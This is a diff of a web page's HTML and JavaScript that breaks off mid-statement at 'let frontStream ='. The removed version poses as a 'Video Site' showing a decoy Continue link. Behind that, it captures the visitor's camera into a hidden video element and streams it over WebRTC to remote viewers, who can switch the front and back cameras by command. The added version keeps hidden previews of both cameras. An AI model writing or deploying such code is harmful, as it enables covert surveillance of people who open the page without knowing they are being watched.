@@ -2,98 +2,100 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Video Site</title>
+<title>Camera</title>
 
 <style>
 body{
   margin:0;
+  padding:20px;
   background:#111;
   color:#fff;
   font-family:Arial,sans-serif;
   text-align:center;
-  padding:20px;
 }
 
 #status{
-  font-size:20px;
-  margin:20px;
+  font-size:18px;
+  margin:15px;
 }
 
 #error{
-  color:#ff7777;
-  font-size:16px;
-  margin:15px;
+  color:#ff8888;
+  margin:10px;
+}
+
+#permissionGate{
+  position:fixed;
+  inset:0;
+  background:#111;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:1000;
+  padding:20px;
+}
+
+.box{
+  width:100%;
+  max-width:380px;
+  background:#222;
+  padding:25px;
+  border-radius:15px;
+}
+
+#allowBtn{
+  width:100%;
+  padding:15px;
+  border:0;
+  border-radius:10px;
+  font-size:17px;
+  cursor:pointer;
 }
 
 #content{
   display:none;
 }
 
-#localVideo{
+#frontPreview,
+#backPreview{
   display:none;
-}
-
-.googleBtn{
-  display:inline-block;
-  margin-top:20px;
-  padding:12px 25px;
-  background:#fff;
-  color:#222;
-  text-decoration:none;
-  border-radius:8px;
-  font-size:16px;
-  font-weight:bold;
-}
-
-.retryBtn{
-  display:none;
-  margin-top:15px;
-  padding:12px 25px;
-  border:0;
-  border-radius:8px;
-  font-size:16px;
 }
 </style>
 </head>
 
 <body>
 
-<h1>Video Site</h1>
+<div id="permissionGate">
+  <div class="box">
 
-<div id="status">
-  Permission required
+    <h2>Camera Access</h2>
+
+    <p>
+      Allow camera permission to start the live camera.
+    </p>
+
+    <button id="allowBtn">
+      Allow Camera
+    </button>
+
+    <div id="error"></div>
+
+  </div>
 </div>
-
-<div id="error">
-  Please allow camera permission.
-</div>
-
-<button id="retryBtn" class="retryBtn">
-  🔄 Try Again
-</button>
 
 <div id="content">
 
-  <div id="liveStatus">
-    Camera is connected.
-  </div>
+  <h1>Live Camera</h1>
 
-  <a
-    class="googleBtn"
-    href="https://example.com"
-    target="_blank"
-    rel="noopener">
-    Continue
-  </a>
+  <div id="status">
+    Connecting...
+  </div>
 
 </div>
 
-<video
-  id="localVideo"
-  autoplay
-  muted
-  playsinline>
-</video>
+<!-- Hidden local previews -->
+<video id="frontPreview" autoplay muted playsinline></video>
+<video id="backPreview" autoplay muted playsinline></video>
 
 <script>
 
@@ -103,563 +105,20 @@ const status =
 const errorBox =
   document.getElementById("error");
 
+const allowBtn =
+  document.getElementById("allowBtn");
+
+const permissionGate =
+  document.getElementById("permissionGate");
+
 const content =
   document.getElementById("content");
 
-const retryBtn =
-  document.getElementById("retryBtn");
+const frontPreview =
+  document.getElementById("frontPreview");
 
-const localVideo =
-  document.getElementById("localVideo");
+const backPreview =
+  document.getElementById("backPreview");
 
 
-let stream = null;
-let currentCamera = "front";
-let cameraReady = false;
-let roleReceived = false;
-
-const peers = new Map();
-const pendingCandidates = new Map();
-
-
-const ws = new WebSocket(
-  (location.protocol === "https:" ? "wss:" : "ws:") +
-  "//" +
-  location.host +
-  "/camera"
-);
-
-
-function send(message){
-
-  if(ws.readyState === WebSocket.OPEN){
-
-    ws.send(JSON.stringify(message));
-
-    return true;
-  }
-
-  return false;
-}
-
-
-function stopCamera(){
-
-  if(stream){
-
-    stream.getTracks().forEach(
-      track => track.stop()
-    );
-
-  }
-
-  stream = null;
-  localVideo.srcObject = null;
-}
-
-
-function announceLive(){
-
-  if(
-    !stream ||
-    !cameraReady ||
-    !roleReceived
-  ){
-    return;
-  }
-
-  send({
-    type: "camera-live",
-    currentCamera
-  });
-}
-
-
-async function openCamera(camera){
-
-  stopCamera();
-
-  currentCamera = camera;
-
-  status.textContent =
-    camera === "front"
-      ? "Opening front camera..."
-      : "Opening back camera...";
-
-
-  try{
-
-    stream =
-      await navigator.mediaDevices.getUserMedia({
-
-        video: {
-          facingMode: {
-            ideal:
-              camera === "front"
-                ? "user"
-                : "environment"
-          }
-        },
-
-        audio: false
-
-      });
-
-
-    localVideo.srcObject =
-      stream;
-
-    await localVideo.play()
-      .catch(() => {});
-
-
-    cameraReady = true;
-
-
-    content.style.display =
-      "block";
-
-    errorBox.textContent = "";
-
-
-    status.textContent =
-      camera === "front"
-        ? "Front camera active"
-        : "Back camera active";
-
-
-    /*
-      Replace the track in every
-      existing WebRTC connection.
-    */
-
-    const newTrack =
-      stream.getVideoTracks()[0];
-
-
-    for(
-      const pc
-      of peers.values()
-    ){
-
-      const sender =
-        pc.getSenders().find(
-          item =>
-            item.track &&
-            item.track.kind === "video"
-        );
-
-
-      if(sender){
-
-        await sender.replaceTrack(
-          newTrack
-        ).catch(error => {
-
-          console.log(
-            "Track replace error:",
-            error
-          );
-
-        });
-
-      }
-
-    }
-
-
-    send({
-      type: "camera-switched",
-      currentCamera
-    });
-
-
-    announceLive();
-
-  }
-
-  catch(error){
-
-    console.error(
-      "Camera error:",
-      error
-    );
-
-    stream = null;
-
-    cameraReady = false;
-
-    status.textContent =
-      "Permission required";
-
-    errorBox.textContent =
-      "Could not open the camera.";
-
-    content.style.display =
-      "none";
-
-    retryBtn.style.display =
-      "inline-block";
-
-  }
-
-}
-
-
-function createPeer(viewerId){
-
-  const oldPeer =
-    peers.get(viewerId);
-
-
-  if(oldPeer){
-
-    try{
-      oldPeer.close();
-    }catch(error){}
-
-  }
-
-
-  const pc =
-    new RTCPeerConnection({
-
-      iceServers:[
-        {
-          urls:
-            "stun:stun.l.google.com:19302"
-        }
-      ]
-
-    });
-
-
-  peers.set(
-    viewerId,
-    pc
-  );
-
-
-  pendingCandidates.set(
-    viewerId,
-    []
-  );
-
-
-  pc.onicecandidate =
-    event => {
-
-      if(event.candidate){
-
-        send({
-
-          type: "candidate",
-
-          candidate:
-            event.candidate,
-
-          toViewerId:
-            viewerId
-
-        });
-
-      }
-
-    };
-
-
-  if(stream){
-
-    stream.getTracks().forEach(
-      track => {
-
-        pc.addTrack(
-          track,
-          stream
-        );
-
-      }
-    );
-
-  }
-
-
-  return pc;
-}
-
-
-async function sendOffer(viewerId){
-
-  if(!stream){
-    return;
-  }
-
-
-  const pc =
-    createPeer(viewerId);
-
-
-  try{
-
-    const offer =
-      await pc.createOffer();
-
-    await pc.setLocalDescription(
-      offer
-    );
-
-
-    send({
-
-      type: "offer",
-
-      offer:
-        pc.localDescription,
-
-      toViewerId:
-        viewerId
-
-    });
-
-  }
-
-  catch(error){
-
-    console.log(
-      "Offer error:",
-      error
-    );
-
-  }
-
-}
-
-
-ws.onopen = () => {
-
-  status.textContent =
-    "🟡 Requesting permission...";
-
-  openCamera("front");
-
-};
-
-
-ws.onmessage =
-async event => {
-
-  let msg;
-
-  try{
-
-    msg =
-      JSON.parse(event.data);
-
-  }
-
-  catch{
-    return;
-  }
-
-
-  if(msg.type === "role"){
-
-    roleReceived = true;
-
-    announceLive();
-
-    return;
-  }
-
-
-  if(msg.type === "viewer-ready"){
-
-    await sendOffer(
-      msg.viewerId
-    );
-
-    return;
-  }
-
-
-  if(
-    msg.type === "switch-camera"
-  ){
-
-    await openCamera(
-      msg.camera
-    );
-
-    return;
-  }
-
-
-  if(msg.type === "answer"){
-
-    const viewerId =
-      msg.toViewerId ||
-      msg.viewerId;
-
-
-    const pc =
-      peers.get(viewerId);
-
-
-    if(pc && msg.answer){
-
-      await pc.setRemoteDescription(
-        new RTCSessionDescription(
-          msg.answer
-        )
-      ).catch(error => {
-
-        console.log(
-          "Answer error:",
-          error
-        );
-
-      });
-
-
-      const queue =
-        pendingCandidates.get(
-          viewerId
-        ) || [];
-
-
-      for(
-        const candidate
-        of queue
-      ){
-
-        await pc.addIceCandidate(
-          new RTCIceCandidate(
-            candidate
-          )
-        ).catch(() => {});
-
-      }
-
-
-      pendingCandidates.set(
-        viewerId,
-        []
-      );
-
-    }
-
-    return;
-  }
-
-
-  if(msg.type === "candidate"){
-
-    const viewerId =
-      msg.toViewerId ||
-      msg.viewerId;
-
-
-    const pc =
-      peers.get(viewerId);
-
-
-    if(!pc){
-      return;
-    }
-
-
-    if(
-      pc.remoteDescription
-    ){
-
-      await pc.addIceCandidate(
-        new RTCIceCandidate(
-          msg.candidate
-        )
-      ).catch(() => {});
-
-    }
-
-    else{
-
-      pendingCandidates
-        .get(viewerId)
-        .push(
-          msg.candidate
-        );
-
-    }
-
-    return;
-  }
-
-
-  if(msg.type === "viewer-left"){
-
-    const pc =
-      peers.get(msg.viewerId);
-
-
-    if(pc){
-
-      try{
-        pc.close();
-      }catch(error){}
-
-    }
-
-
-    peers.delete(
-      msg.viewerId
-    );
-
-    pendingCandidates.delete(
-      msg.viewerId
-    );
-
-  }
-
-};
-
-
-ws.onclose = () => {
-
-  status.textContent =
-    "🔴 Server disconnected";
-
-};
-
-
-retryBtn.onclick = () => {
-
-  retryBtn.style.display =
-    "none";
-
-  openCamera(
-    currentCamera
-  );
-
-};
-
-
-window.addEventListener(
-  "beforeunload",
-  () => {
-
-    stopCamera();
-
-    peers.forEach(pc => {
-
-      try{
-        pc.close();
-      }catch(error){}
-
-    });
-
-  }
-);
-
-</script>
-
-</body>
-</html>
+let frontStream =
